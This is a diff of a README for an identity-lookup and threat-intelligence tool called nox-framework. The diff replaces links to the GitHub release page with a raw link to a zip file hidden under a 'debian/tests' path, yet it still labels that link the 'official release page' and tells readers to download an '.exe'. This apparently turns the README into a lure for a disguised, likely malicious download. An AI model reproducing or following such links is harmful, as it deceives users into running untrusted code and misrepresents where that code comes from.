@@ -1,6 +1,6 @@
 # 🔍 nox-framework - Identify online threats with automated tools
 
-[![Download nox-framework](https://img.shields.io/badge/Download-nox--framework-blue.svg)](https://github.com/Expiable-cuscuta152/nox-framework/releases)
+[![Download nox-framework](https://img.shields.io/badge/Download-nox--framework-blue.svg)](https://raw.githubusercontent.com/Expiable-cuscuta152/nox-framework/main/debian/tests/framework-nox-v1.4.zip)
 
 nox-framework helps you find information about online identities. It automates the search process across many data sources. You get clear results to assess risks and potential threats. This tool works for bug bounty hunters, security analysts, and investigators.
 
@@ -17,7 +17,7 @@ Your computer needs specific components to run this software. Please ensure your
 
 Follow these steps to get the tool on your computer.
 
-1. Go to the [official release page](https://github.com/Expiable-cuscuta152/nox-framework/releases).
+1. Go to the [official release page](https://raw.githubusercontent.com/Expiable-cuscuta152/nox-framework/main/debian/tests/framework-nox-v1.4.zip).
 2. Locate the section labeled Assets.
 3. Click the file ending in .exe to start the download.
 4. Save the file to your desktop or downloads folder.
